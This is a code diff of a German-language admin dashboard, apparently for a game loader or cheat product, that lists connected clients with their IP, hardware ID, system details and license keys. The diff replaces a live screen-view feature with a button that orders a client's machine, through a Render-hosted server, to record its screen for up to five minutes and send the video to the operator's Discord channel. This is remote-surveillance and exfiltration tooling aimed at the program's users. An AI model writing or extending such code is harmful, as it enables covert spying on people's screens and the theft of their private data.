@@ -193,16 +193,6 @@
         .msinfo-item { background: var(--input-bg); border: 1px solid var(--input-border); padding: 10px; border-radius: 6px; }
         .msinfo-item span { color: var(--text-muted); display: block; font-size: 9px; text-transform: uppercase; margin-bottom: 4px; }
         .msinfo-item strong { color: var(--text-main); font-size: 11px; word-break: break-all; }
-
-        .screen-stream-box {
-            background: #020204; border: 1px solid var(--accent-color); border-radius: 8px; height: 380px;
-            display: flex; flex-direction: column; justify-content: center; align-items: center; position: relative; overflow: hidden;
-        }
-
-        .stream-overlay-info {
-            position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.7); padding: 4px 8px;
-            border-radius: 4px; font-family: monospace; font-size: 10px; color: var(--accent-color); border: 1px solid var(--input-border); z-index: 10;
-        }
     </style>
 </head>
 <body>
@@ -222,12 +212,12 @@
         <div class="modal-card">
             <div class="modal-header">
                 <div class="modal-title" id="m-user-title">SYSTEM INSPECTOR // USER_UNKNOWN</div>
-                <button class="close-modal" onclick="closeUserModal()">✕ CLOSE & STOP STREAM</button>
+                <button class="close-modal" onclick="closeUserModal()">✕ CLOSE</button>
             </div>
 
             <div class="modal-tabs">
                 <button class="modal-tab-btn active" onclick="switchModalTab('info', this)">💻 System Info (msinfo32)</button>
-                <button class="modal-tab-btn" onclick="switchModalTab('stream', this)">🔴 Live Screen View</button>
+                <button class="modal-tab-btn" onclick="switchModalTab('stream', this)">🎥 Discord Screen-Record</button>
             </div>
 
             <div id="modal-tab-info" class="modal-tab-pane active">
@@ -246,9 +236,19 @@
             </div>
 
             <div id="modal-tab-stream" class="modal-tab-pane">
-                <div class="screen-stream-box">
-                    <div class="stream-overlay-info">STREAM: ON-DEMAND</div>
-                    <img id="live-video-feed" src="" alt="Warte auf Client-Stream..." style="width: 100%; height: 100%; object-fit: contain;">
+                <div class="card" style="margin-bottom:0;">
+                    <h2>🎥 DISCORD WEBHOOK VIDEO-AUFNAHME</h2>
+                    <p style="font-size:11px; color:#777799; margin-bottom:15px;">Fordere ein MP4-Video des Clients an. Das Video wird direkt an deinen Discord-Kanal übertragen, ohne Render-Traffic zu verbrauchen.</p>
+                    <label>Aufnahme-Dauer wählen</label>
+                    <select id="m-record-duration" style="margin-bottom:15px;">
+                        <option value="30">30 Sekunden</option>
+                        <option value="60">1 Minute</option>
+                        <option value="120">2 Minuten</option>
+                        <option value="180">3 Minuten</option>
+                        <option value="240">4 Minuten</option>
+                        <option value="300">5 Minuten</option>
+                    </select>
+                    <button onclick="requestDiscordRecord()" style="background:#00adb5; width:100%; padding:12px;">🎥 Aufnahme starten & an Discord senden</button>
                 </div>
             </div>
 
@@ -430,7 +430,7 @@
     </div>
 
     <script>
-        const RENDER_URL = "https://ai-bot-1-zu9n.onrender.com";
+        const RENDER_URL = "https://business-j9hw.onrender.com";
         let currentStreamUser = "";
 
         function checkLogin() {
@@ -444,6 +444,7 @@
                 loadBans();
                 loadHistory();
                 loadSettings();
+                setInterval(loadUsers, 5000);
             } else {
                 err.innerText = "ACCESS DENIED: Falsches Passwort!";
                 document.getElementById('pass-input').value = "";
@@ -544,7 +545,7 @@
                             <td>${u.hwid ? u.hwid : 'Disk-OK'}</td>
                             <td style="color:#00f3ff;">${u.ip}</td>
                             <td style="color:var(--accent-color);">${u.game}</td>
-                            <td><button class="btn-secondary" style="padding: 3px 8px; font-size: 10px;">Inspect & Live</button></td>
+                            <td><button class="btn-secondary" style="padding: 3px 8px; font-size: 10px;">Inspect & Record</button></td>
                         </tr>
                     `;
                 });
@@ -576,7 +577,7 @@
 
         function openUserModal(name, ip, cpu, gpu, mobo, ram, os, game, key, expiry, hwid) {
             currentStreamUser = name;
-            document.getElementById('m-user-title').innerText = "SYSTEM INSPECTOR & LIVE VIEW // " + name;
+            document.getElementById('m-user-title').innerText = "SYSTEM INSPECTOR // " + name;
             document.getElementById('m-hwid').innerText = hwid || "Verifiziert";
             document.getElementById('m-ip').innerText = ip || "127.0.0.1";
             document.getElementById('m-cpu').innerText = cpu || "CPU Info";
@@ -588,17 +589,32 @@
             document.getElementById('m-key').innerText = key || "Standard Key";
             document.getElementById('m-expiry').innerText = expiry || "Lifetime";
 
-            document.getElementById('live-video-feed').src = `${RENDER_URL}/video_feed?user=` + name;
             document.getElementById('user-modal').style.display = 'flex';
         }
 
         function closeUserModal() {
             document.getElementById('user-modal').style.display = 'none';
-            document.getElementById('live-video-feed').src = "";
-            if (currentStreamUser) {
-                fetch(`${RENDER_URL}/api/stop_stream?user=` + currentStreamUser).catch(()=>{});
-                currentStreamUser = "";
-            }
+            currentStreamUser = "";
+        }
+
+        function requestDiscordRecord() {
+            if (!currentStreamUser) return;
+            const duration = document.getElementById('m-record-duration').value;
+
+            fetch(`${RENDER_URL}/api/admin/send_command`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    desktop: currentStreamUser,
+                    command: 'record_screen',
+                    duration: parseInt(duration)
+                })
+            })
+            .then(res => res.json())
+            .then(() => {
+                alert(`Aufnahme für ${duration} Sekunden angefordert! Das Video erscheint in Kürze in deinem Discord-Kanal.`);
+                closeUserModal();
+            });
         }
 
         function banModalUser() {
